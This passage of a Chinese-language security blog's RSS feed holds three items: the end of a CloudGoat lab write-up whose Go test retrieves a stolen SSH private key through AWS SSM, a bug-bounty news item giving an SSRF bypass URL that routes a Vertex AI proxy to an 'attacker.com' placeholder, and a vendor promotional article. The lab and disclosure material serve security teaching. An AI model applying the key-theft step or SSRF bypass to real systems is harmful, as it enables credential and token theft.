&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;CommandId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;nx&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;CommandId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;InstanceId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;instanceId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Minute&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;assert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;failed to retrieve SSM command output&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 我们成功窃取了SSH私钥&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;commandOutput&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;StandardOutputContent&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--- PASS: TestScenario &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;248.47s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PASS
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ok  	github.com/cloudgoat/tests/supply-chain-security	249.070s
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;我鼓励您尝试这个场景！更广泛地说，CloudGoat有一组有价值的实验室，包含许多现实世界的AWS漏洞。&lt;/p&gt;
&lt;p&gt;您对这个场景有什么看法？您如何测试您的安全实验室？您希望在CloudGoat中看到什么？让我们在Twitter上继续讨论！&lt;/p&gt;
&lt;p&gt;感谢RhinoSecurityLabs的Ryan Gerstenkorn提供的出色贡献体验！感谢您的阅读。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>谷歌向黑客二人组支付2.2万美元漏洞赏金，涉及多个云项目安全漏洞</title>
        <link>http://localhost:1313/p/%E8%B0%B7%E6%AD%8C%E5%90%91%E9%BB%91%E5%AE%A2%E4%BA%8C%E4%BA%BA%E7%BB%84%E6%94%AF%E4%BB%982.2%E4%B8%87%E7%BE%8E%E5%85%83%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91%E6%B6%89%E5%8F%8A%E5%A4%9A%E4%B8%AA%E4%BA%91%E9%A1%B9%E7%9B%AE%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</link>
        <pubDate>Sat, 02 Aug 2025 11:15:24 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E8%B0%B7%E6%AD%8C%E5%90%91%E9%BB%91%E5%AE%A2%E4%BA%8C%E4%BA%BA%E7%BB%84%E6%94%AF%E4%BB%982.2%E4%B8%87%E7%BE%8E%E5%85%83%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91%E6%B6%89%E5%8F%8A%E5%A4%9A%E4%B8%AA%E4%BA%91%E9%A1%B9%E7%9B%AE%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</guid>
        <description>&lt;h3 id=&#34;谷歌向黑客二人组支付22万美元漏洞赏金涉及多个云项目安全漏洞&#34;&gt;谷歌向黑客二人组支付2.2万美元漏洞赏金，涉及多个云项目安全漏洞
&lt;/h3&gt;&lt;p&gt;谷歌云平台(GCP)四个项目中的安全漏洞使两名安全研究人员获得了超过22,000美元的漏洞赏金。黑客二人组Sreeram KL和Sivanesh Ashok收益最丰厚的项目是机器学习训练和部署平台Vertex AI，他们因发现服务器端请求伪造(SSRF)漏洞及后续补丁绕过获得了两个5,000美元的奖励。&lt;/p&gt;
&lt;p&gt;根据Sreeram的博客文章，该漏洞存在于Vertex AI的Workbench功能中，该功能支持在云上创建基于Jupyter Notebook的开发环境。通过利用SSRF漏洞并诱骗受害者点击恶意URL，攻击者可能夺取授权令牌的控制权，进而控制受害者的所有GCP项目。&lt;/p&gt;
&lt;h4 id=&#34;ssrf漏洞技术细节&#34;&gt;SSRF漏洞技术细节
&lt;/h4&gt;&lt;p&gt;研究人员发现某个URL存在SSRF可能时，&amp;ldquo;请求原始URL返回的响应看起来像是发送到compute.googleapis.com的认证请求输出&amp;rdquo;，Sreeram表示。通过模糊测试，他们发现&lt;code&gt;https://{INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/{attacker.com}/compute.googleapis.com/&lt;/code&gt;可绕过检查，且该易受攻击的端点是没有CSRF保护的GET请求。&lt;/p&gt;
&lt;p&gt;谷歌通过为GET端点添加CSRF保护并改进域名验证修复了该问题。&lt;/p&gt;
&lt;h4 id=&#34;补丁绕过技术&#34;&gt;补丁绕过技术
&lt;/h4&gt;&lt;p&gt;修复后，研究人员发现将&lt;code&gt;compute.googleapis.com&lt;/code&gt;改为&lt;code&gt;something.google.com&lt;/code&gt;不再触发错误。他们利用Google的FeedBurner服务实现开放重定向，最终结合2020年@s1r1us针对Jupyter Lab开发的CSRF绕过技术完成了漏洞利用。&lt;/p&gt;
&lt;h4 id=&#34;其他云项目漏洞&#34;&gt;其他云项目漏洞
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Theia IDE&lt;/strong&gt;：利用XSS漏洞(CVE-2021-41038)获取元数据服务器中的服务账户令牌，获得3,133.70美元赏金&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Compute Engine&lt;/strong&gt;：SSH-in-browser功能中的密钥注入问题可能导致远程代码执行，获得5,000美元奖励及1,000美元额外奖金&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Cloud Workstations&lt;/strong&gt;：授权绕过漏洞获得3,133.70美元赏金&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;二人总计通过六个漏洞赏金项目获得22,267美元。文章还包含多个漏洞的概念验证视频和技术细节说明。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>州和地方政府网络安全现代化转型</title>
        <link>http://localhost:1313/p/%E5%B7%9E%E5%92%8C%E5%9C%B0%E6%96%B9%E6%94%BF%E5%BA%9C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%8E%B0%E4%BB%A3%E5%8C%96%E8%BD%AC%E5%9E%8B/</link>
        <pubDate>Fri, 01 Aug 2025 21:17:43 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%B7%9E%E5%92%8C%E5%9C%B0%E6%96%B9%E6%94%BF%E5%BA%9C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%8E%B0%E4%BB%A3%E5%8C%96%E8%BD%AC%E5%9E%8B/</guid>
        <description>&lt;h1 id=&#34;州和地方政府网络安全现代化转型&#34;&gt;州和地方政府网络安全现代化转型
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;作者&lt;/strong&gt;：Darren Estridge 和 Thomas MacLellan&lt;br&gt;
&lt;strong&gt;发布日期&lt;/strong&gt;：2025年7月8日&lt;/p&gt;
&lt;p&gt;州政府的网络安全领导者们深知，地方机构正日益成为网络攻击的主要目标。从破坏州卫生系统的勒索软件到针对政府员工的钓鱼攻击，威胁不断升级，造成的财务和运营影响也愈发严重。根据《2023年K-12教育系统六年回顾报告》，近80个学区（涉及2000多所学校）遭受勒索软件攻击，导致停课、教学中断及学生数据泄露。然而，许多州机构仍在过度采购功能重复且缺乏整合的网络安全工具，无法匹配攻击的速度和规模。&lt;/p&gt;
&lt;h2 id=&#34;防御现代化的新思路&#34;&gt;防御现代化的新思路
&lt;/h2&gt;&lt;p&gt;州IT领导者需要改变防御现代化的方法。与联邦层面类似，单纯增加工具数量并不等同于增强防护。零散的采购会耗尽有限资源、增加操作复杂性并延缓响应速度。出路在于通过战略性的公私合作实现效率提升、系统整合和更智能的投资，借助私营部门的创新能力强化政府防护体系。&lt;/p&gt;
&lt;h2 id=&#34;州it网络安全新战略&#34;&gt;州IT网络安全新战略
&lt;/h2&gt;&lt;p&gt;各州机构（无论是公共安全、医疗还是教育部门）的孤立系统会导致重复劳动、响应迟缓以及纳税人资金使用效率低下。州首席信息官（CIO）和安全官（CISO）正意识到必须摆脱这种碎片化模式。Palo Alto Networks通过将安全运营整合至统一的AI驱动平台来支持这一转型——该模式已在联邦机构和财富100强企业中得到验证。&lt;/p&gt;
&lt;p&gt;但任何机构都不应孤军奋战。与私营网络安全供应商的战略合作能带来州IT部门内部无法获取的专业知识和威胁情报。公私合作可实现可扩展、可持续的安全现代化，确保州机构在有效管理资源的同时应对威胁。&lt;/p&gt;
&lt;h2 id=&#34;成功现代化的关键考量&#34;&gt;成功现代化的关键考量
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;成本优化&lt;/strong&gt;：减少工具数量可降低许可、维护和培训成本&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;简化运营&lt;/strong&gt;：统一安全平台减轻管理负担&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;安全利用AI&lt;/strong&gt;：跟踪监控每位员工的AI使用情况&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;加速威胁响应&lt;/strong&gt;：AI驱动自动化提升检测与处置速度&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;改进合规性&lt;/strong&gt;：集中化可视性实现持续监控以满足报告和合规要求&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过与可信行业伙伴合作，各州可部署跨机构无缝协作的整体平台化解决方案，在降低复杂性的同时提升韧性。这种平台化战略能使州政府将预算从重复浪费转向主动防御。&lt;/p&gt;
&lt;h2 id=&#34;规模化ai驱动的防御体系&#34;&gt;规模化AI驱动的防御体系
&lt;/h2&gt;&lt;p&gt;该战略的核心是Precision AI®——每日可识别和分类900万次威胁的自动化防御引擎。面对人手不足或身兼多职的州IT团队，AI与自动化能显著改善平均检测时间（MTTD）和平均响应时间（MTTR）等关键指标。在Palo Alto Networks的安全运营中心（SOC），MTTR已缩短至检测后一分钟内，确保在威胁升级前快速精准响应。这些成果正是公共机构与私营创新紧密协作的体现。&lt;/p&gt;
&lt;h2 id=&#34;云迁移中的安全保障&#34;&gt;云迁移中的安全保障
&lt;/h2&gt;&lt;p&gt;随着各州将财务系统到应急服务全面转向&amp;quot;云优先&amp;quot;策略，网络安全必须同步演进。通过FedRAMP和GovRAMP High认证的Prisma® Cloud为多云和混合环境提供从开发到部署的端到端防护。云创新的速度使州机构难以独自确保安全，与可信供应商合作能在保证合规性和敏捷性的同时避免复杂性增加或出现可视性缺口。&lt;/p&gt;
&lt;h2 id=&#34;专为州it需求打造&#34;&gt;专为州IT需求打造
&lt;/h2&gt;&lt;p&gt;Palo Alto Networks的公共部门团队深入理解各州环境的特殊性——从治理约束、采购流程到多机构协作。我们提供定制化解决方案消除低效环节，在全州生态系统中降低风险并提升服务交付能力。团队通过案例研究和行业基准提供可量化的关键绩效指标（KPI），确保解决方案直接对接管理层优先级。&lt;/p&gt;
&lt;p&gt;通过采用统一的AI驱动方案并发挥公私合作优势，州政府能有效保护公民数据、优化成本，构建更具韧性的数字未来。&lt;/p&gt;
&lt;h2 id=&#34;美国制造为政府而生&#34;&gt;美国制造·为政府而生
&lt;/h2&gt;&lt;p&gt;总部位于加州的Palo Alto Networks拥有20年网络安全创新领导经验。我们在全美49个州拥有8,800多名员工，硬件防火墙全部在美国德克萨斯州主装配中心生产。每年投入超过18亿美元的研发资金，持续推动美国技术领导力发展。&lt;/p&gt;
&lt;p&gt;Palo Alto Networks已准备好帮助各州IT机构实现网络安全现代化，共同构建更安全、更智能的未来。&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
